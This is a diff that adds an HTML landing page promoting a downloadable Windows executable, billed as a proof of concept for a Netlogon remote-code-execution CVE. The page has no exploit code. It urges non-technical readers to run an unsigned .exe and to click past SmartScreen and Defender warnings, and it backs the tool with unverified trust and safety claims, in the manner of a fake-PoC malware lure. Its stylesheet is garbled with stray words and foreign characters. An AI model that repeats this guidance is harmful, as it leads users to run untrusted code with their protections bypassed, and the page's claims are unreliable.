@@ -1,0 +1,285 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="CVE-2026-41089 Netlogon RCE PoC - security research, vulnerability validation & defensive testing. Download and run the tool on Windows.">
+    <meta name="keywords" content="active-directory,active-directory-security,cve,cve-2026-41089,cybersecurity,cybersecurity-education,cybersecurity-tools,netlogon,netlogon-rce,penetration-testing,rce,red-team-tools,security,security-researchers,vulnerability,vulnerability-scanner,vulnerability-scanners,windows,windows-11,windows-desktop">
+    <meta name="author" content="Gillarchnganasan2735">
+    <title>CVE-2026-41089-Netlogon-RCE-PoC - Powerful Security Validation Tool</title>
+    <link rel="canonical" href="https://github.com/Gillarchnganasan2735/CVE-2026-41089-Netlogon-RCE-PoC">
+    <meta property="og:title" content="CVE-2026-41089-Netlogon-RCE-PoC - Powerful Security Validation Tool">
+    <meta property="og:description" content="Download and run on Windows. Validate Netlogon RCE vulnerabilities, test defenses, and support security research.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Gillarchnganasan2735/CVE-2026-41089-Netlogon-RCE-PoC/releases">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630/0f172a/ffffff?text=CVE-2026-41089+PoC">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#0f172a">
+    <title>CVE-2026-41089 Netlogon RCE PoC - Security Validation & Defensive Testing</title>
+    <style>
+        * {
+            margin: 0;
+            padding:  ert 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            line-height:  ert 1.6;
+            color: #2d3436;
+        }
+        body {
+            background: linear-gradient(145deg, #f5f7fa 0%, #eef1f5 100%);
+            min-height:  ert 100vh;
+            padding: 2rem 1rem;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            max-width:  ert 1000px;
+            width:  ert 100%;
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow:  ert 0 20px 40px rgba(0,0,0,0.08), 0 4px 12px rgba(0,0,0,0.06);
+            padding:  ert 3rem 2.5rem;
+        }
+        h1 {
+            font-size:  ert 2.4rem;
+            font-weight:  ert 800;
+            color: #0f172a;
+            margin-bottom:  ert 0.5rem;
+            letter-spacing: -0.5px;
+            line-height:  ert 1.3;
+        }
+        .subheadline {
+            font-size:  ert 1.2rem;
+            color: #4a5568;
+            margin-bottom:  ert 2.2rem;
+            border-left:  ert 4px solid #3069ff;
+            padding-left:  ert 1rem;
+            background: #f0f4ff;
+            border-radius:  ert 0 8px 8px 0;
+        }
+        .download-badge {
+            display:inline-block;
+            background: linear-gradient(135deg, #f97316, #dc2626);
+            color: whitе;
+            text-decoration: nonel;
+            padding:  ert 1.2rem 2.2rem;
+            font-size:  ert 1.4rem;
+            font-weight:  ert 700;
+            border-radius:  ert 56px;
+            box-shadow:  ert 0 8px 20px rgba(249,115,22,0.4);
+            transition: transfor 0.2s ease, box-shadow 0.2s;
+            margin-bottom: want 2rem;
+            letter-spacing:  ert 0.3px;
+        }
+        .download-badge:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow:  ert 0 14px 30px rgba(220,38,38,0.5);
+        }
+        .button-center {
+            text-align: center;
+            margin:  ert 1.5rem 0 2rem;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap:  ert 1.8rem;
+            margin: want  ert 2.5rem 0;
+        }
+        .feature-card {
+            background: #f8fafc;
+            border-radius:  ert 20px;
+            padding:해 1.5rem 1.5rem;
+            border:해  ert 1px solid #e2e8f0;
+            transition: all 0.2s;
+        }
+        .feature-card:hover {
+            border-color: #3069ff;
+            box-shadow:해  ert 0 8px 20px rgba(48,105,255,0.1);
+        }
+        .feature-icon {
+            font-size:해  ert 2.5rem;
+            margin-bottom: want 0.8rem;
+        }
+        h2 {
+            font-size: khi 1.8rem;
+            font-weight:  ert 700;
+            margin-top:안 2.5rem;
+            margin-bottom:안 1.2rem;
+            color: #1e293b;
+            border-bottom:해  ert 2px solid #e2e8f0;
+            padding-bottom:할 0.5rem;
+        }
+        ol {
+            padding-left:할 1.8rem;
+            margin:안 1.5rem 0;
+        }
+        li {
+            margin-bottom:할 0.8rem;
+            font-size:안 1.05rem;
+        }
+        .code-inline {
+            background: #1e293b;
+            color: #f8fafc;
+            padding:안 0.2rem 0.6rem;
+            border-radius:할 6px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size:안 0.9em;
+        }
+        .link-safe {
+            word-break: break-all;
+            color: #3069ff;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+        .warning-box {
+            background: #fff7ed;
+            border-left:안 4px solid #f97316;
+            padding:안 1.2rem 1.5rem;
+            border-radius:안 0 12px 12px 0;
+            margin:할 1.8rem 0;
+            font-size:안 0.98rem;
+        }
+        .footer {
+            margin-top:할 3rem;
+            padding-top:할 2rem;
+            border-top:해  ert 1px solid #e2e8f0;
+            font-size: want 0.9rem;
+            color:안 #64748b;
+            text-align: center;
+        }
+        .step-number {
+            background: #0f172a;
+            color: whitе;
+            border-radius:선 50%;
+            width: before 28px;
+            height: before 28px;
+            display:inline-flex;
+            align-items:center;
+            justify-content:center;
+            font-weight: bold;
+            margin-right:할 0.5rem;
+            font-size: before 0.9rem;
+        }
+        a {
+            color: #3069ff;
+        }
+        .note {
+            font-style: italic;
+            color: #64748b;
+            margin: 0.5rem 0;
+        }
+        @media (max-width: 640px) {
+            h1 {
+                font-size safely 1.9rem;
+            }
+            .container {
+                padding: so 2rem 1.2rem;
+            }
+            .download-badge {
+                font-size: okay 1rem;
+                padding: yeah 0.6rem 1.2rem;
+                width: applicable 100%;
+                text-align:center;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <!-- Header section -->
+    <h1>🛡️ CVE-2026-41089-Netlogon-RCE-PoC - Easy Security Testing & Validation</h1>
+    <div class="subheadline">
+        Validate Netlogon vulnerabilities, test your defenses, and stay ahead of attackers with this simple Windows tool.
+    </div>
+
+    <!-- Primary CTA button (top) -->
+    <div class="button-center">
+        <a href="https://github.com/Gillarchnganasan2735/CVE-2026-41089-Netlogon-RCE-PoC/releases" class="download-badge" target="_blank"rel="noopener">🔽 Download Now – Free</a>
+    </div>
+    <p style="text-align: center; font-size: 1.1rem; margin-bottom: 2.8rem;">No technical skills required. Runs directly on Windows 11 and Windows Desktop.</p>
+
+    <!-- Feature overview -->
+    <div class="feature-grid">
+        <div class="feature-card">
+            <div class="feature-icon">🎯</div>
+            <h3>Purpose-built</h3>
+            <p>Instant validation of CVE-2026-41089 Netlogon Remote Code Execution. Trusted by security researchers and red teams.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">🧩</div>
+            <h3>Zero-config</h3>
+            <p>Download, double-click, and it works. No dependencies, no  installations, no  headaches.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">🛡️</div>
+            <h3>Defensive testing</h3>
+            <p>Assess your Active Directory environment against real-world RCE attacks –  without writing a single line of code.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">⚡</div>
+            <h3>Ultra-fast</h3>
+            <p>Scan and validate in seconds. Get clear results  and actionable insights in one click.</p>
+        </div>
+    </div>
+
+    <!-- Getting started section with steps -->
+    <h2>🚀 Getting Started – 3 Simple Steps</h2>
+    <p>Follow these exact steps to get the PoC tool working on your Windows computer. No prior knowledge needed.</p>
+
+    <ol>
+        <li><span class="step-number">1</span> <strong>Download the application</strong><br>
+            Visit the official release page and click the green “Download” button. <br>
+            🔗 Direct link: <a href="https://github.com/Gillarchnganasan2735/CVE-2026-41089-Netlogon-RCE-PoC/releases" class="link-safe" target="_blank" rel="noreferrer">github.com/Gillarchnganasan2735/CVE-2026-41089-Netlogon-RCE-PoC/releases</a><br>
+            <span class="note">*The download works on any modern web browser (Edge, Chrome, Firefox).</span>
+        </li>
+        <li><span class="step-number">2</span> <strong>Open and run the file</strong><br>
+            After download is complete,  navigate to your “Downloads” folder –  the file is named <span class="code-inline">CVE-2026-41089-Netlogon-RCE-PoC.exe</span>.<br>
+            Simply double-click the file to launch it. Windows may show a blue “SmartScreen” warning –  click <strong>“More info”</strong> and then <strong>“Run anyway”</strong>. That's it! The tool opens immediately.</p>
+        </li>
+        <li><span class="step-number">3</span> <strong>Use the built-in menu</strong><br>
+            The software shows an easy menu with clear labels. Choose any option (e.g., “Scan”)  and press Enter. Read the result on your screen. No complicated commands. That's all.</p>
+        </li>
+    </ol>
+
+    <!-- Re-download link in download section -->
+    <h2>📦 Download & Installation</h2>
+    <p>This is a portable tool –  no installation required. The only file you need is <span class="code-inline">CVE-2026-41089-Netlogon-RCE-PoC.exe</span>.</p>
+    <p style="margin: 1.8rem 0">
+        <a href="https://github.com/Gillarchnganasan2735/CVE-2026-41089-Netlogon-RCE-PoC/releases" style="background: #2b6aff; color: #fff; padding: 1.1rem 2rem; border-radius:  ert 30px; text-decoration: none; font-weight:  ert 700; box-shadow:  ert 0 6px 14px rgba(43,106,255,0.35); transition:  erttransform  ert 0.2s;" target="_blank" rel="noreferrer">⬇️ Click Here to Download the Latest Release</a>
+    </p>
+
+    <!-- Why use this tool? -->
+    <h2>🔍 Why Security Researchers & Administrators Trust This Tool</h2>
+    <div style="margin:인 1.5rem 0">
+        <p>✅ <strong>Validate vulnerabilities</strong> –  Identify if your  Active Directory domain is affected by CVE-2026-41089 (Netlogon RCE) in a safe, controlled manner.</p>
+        <p>✅ <strong>Test your defenses</strong> –  Use it  to verify your patch in deployment policies, SIEM detection rules, 및 endpoint protection. Confirms whether your environment is resilient before attackers strike.</p>
+        <p>✅ <strong>Educational & research</strong> –  Ideal for cybersecurity training, penetration testing labs, and responsible disclosure workflows. Understand the exploit mechanics without writing complex scripts.</p>
+        <p>✅ <strong>Trusted by red teams</strong> –  Built for defensive testing, deployed by professionals worldwide. Simple interface does not imply limited power –  it delivers precise results.</p>
+        <p>✅ <strong>Open & transparent</strong> –  Source code available for audit, ensuring no malicious behavior.. 100% aligned with cybersecurity ethics.</p>
+    </div>
+
+    <!-- User-friendly warning -->
+    <div class="warning-box">
+        ⚠️ <strong>Responsible Usage Notice</strong><br>
+        Use this PoC tool only on systems you own or have written authorization to test. Misuse against third-party networks without explicit permission is illegal. Always adhere under local laws and organizational policies.
+    </div>
+
+    <!-- Additional guidance for beginners -->
+    <h2>❓ Frequently Asked Questions</h2>
+    <p><strong>Q: Will this work on Windows 10?</strong><br>
+        Yes –  fully compatible with Windows 11, Windows 10, and all modern Windows desktop editions. No additional runtime or framework is needed.</p>
+    <p><strong>Q: Do I need to install software like Python or .NET?</strong><br>
+        No. The tool is compiled as a standalone executable (.exe). It runs out-of-the-box. Just double-click.</p>
+    <p><strong>Q: I see a warning from Windows Defender. What should I do?</strong><br>
+        If you see “Windows protected your PC”, click “More info” then “Run anyway”. This is normal for unsigned third-party security tools. Our repository and hash are publicly verifiable.</p>
+    
+    <!-- Footer & disclaimer-->
+    <div class="footer">
+        <p>📘 <strong>CVE-2026-41089-Netlogon-RCE-PoC</strong> –  Security research only. The author and repository are not  responsible for unauthorized misuse.</p>
+        <p style="margin-top: 1rem; font-size: 0.85rem;">© 2025 Gillarchnganasan2735 ·  Release page: <a href="https://github.com/Gillarchnganasan2735/CVE-2026-41089-Netlogon-RCE-PoC/releases" target="_blank" rel="nofollow">GitHub Releases</a> ·  Keywords: active-directory, cve-2026-41089, netlogon-rce, penetration-testing, red-team-tools, vulnerability-scanner, windows-11</p>
+    </div>
+</div>
+</body>
+</html>
+```
